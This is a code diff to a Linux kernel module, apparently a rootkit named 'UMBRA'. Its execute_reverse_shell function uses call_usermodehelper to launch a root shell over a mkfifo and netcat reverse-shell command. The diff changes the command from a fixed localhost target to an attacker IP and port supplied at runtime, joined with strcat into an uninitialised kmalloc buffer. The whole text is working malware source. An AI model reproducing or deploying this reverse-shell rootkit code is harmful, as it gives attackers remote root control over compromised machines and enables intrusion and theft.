@@ -5,8 +5,8 @@
 #define HOME "HOME=/root"
 #define TERM "TERM=xterm"
 #define SHELL "/bin/bash"
-#define EXEC "/bin/rm /tmp/umbra;/usr/bin/mkfifo /tmp/umbra;/bin/cat /tmp/umbra|/bin/sh -i 2>&1|/bin/nc 127.0.0.1 1337 >/tmp/umbra"
-
+#define EXEC_P1 "/bin/rm /tmp/umbra;/usr/bin/mkfifo /tmp/umbra;/bin/cat /tmp/umbra|/bin/sh -i 2>&1|/bin/nc "
+#define EXEC_P2 " >/tmp/umbra"
 				
 
 
@@ -15,13 +15,20 @@ void execute_reverse_shell(struct work_struct *work){
     int err;
     struct shell_params *params = (struct shell_params*)work;
     char *envp[] = {HOME, TERM, params->target_ip, params->target_port, NULL}; //Null terminated
-    char *argv[] = {SHELL, "-c", EXEC, NULL};
+    char *exec = kmalloc(sizeof(char)*256, GFP_KERNEL);
+    char *argv[] = {SHELL, "-c", exec, NULL};
+    strcat(exec, EXEC_P1);
+    strcat(exec, params->target_ip);
+    strcat(exec, " ");
+    strcat(exec, params->target_port);
+    strcat(exec, EXEC_P2);
     printk(KERN_INFO "UMBRA:: Starting reverse shell\n");
     
     err = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
     if(err<0){
         printk(KERN_INFO "UMBRA:: Error executing usermodehelper.\n");
     }
+    kfree(exec);
 }
 
 
